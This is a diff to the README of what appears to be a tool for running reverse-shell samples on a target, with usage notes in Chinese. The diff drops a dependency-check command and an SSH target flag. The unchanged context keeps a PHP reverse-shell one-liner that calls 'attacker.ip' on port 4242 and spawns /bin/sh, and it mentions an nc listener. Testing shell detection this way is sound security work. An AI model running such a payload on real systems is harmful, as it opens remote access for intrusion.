@@ -17,7 +17,6 @@ Usage:
 
 Available Commands:
   completion  Generate the autocompletion script for the specified shell
-  deps        Create a script to check dependencies
   help        Help about any command
   run         Run reverse shell samples on the target
 
@@ -39,19 +38,12 @@ samples:
   script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-先生成一个检查依赖的脚本
-```bash
-./bin/tomorin deps -c config.yml
-```
-
-把生成的脚本 `check-deps` 复制到目标机器上执行。工具的实现原理是从当前机器SSH到目标机器上执行样本，所以需要目标机器安装SSH Server。
-
 > 目前还没有反弹shell server的功能，所以需要用nc拉起来单独的server。
 
 确认所有依赖都无误之后，执行所有反弹Shell样本
 
 ```bash
-./bin/tomorin run -c config.yml -t ubuntu@attacker.ip
+./bin/tomorin run -c config.yml
 ```
 
 ## TODO
